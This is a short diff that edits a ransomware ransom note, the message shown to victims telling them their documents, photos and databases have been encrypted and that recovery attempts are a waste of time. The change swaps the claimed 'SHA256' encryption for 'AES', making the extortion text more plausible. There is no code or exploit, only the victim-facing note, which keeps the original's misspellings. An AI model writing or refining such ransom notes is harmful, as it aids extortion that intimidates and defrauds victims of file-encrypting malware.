@@ -1,5 +1,5 @@
 What Happend to My Computer?
-your important files have been encrypted using a millitary grade SHA256 algorithm.
+your important files have been encrypted using a millitary grade AES algorithm.
 Many of your documents, photos, videos, databases and other files are no longer 
 accesible because they have been encrypted.
 Maybe you are looking for a way to recover your files but do not waste your time.
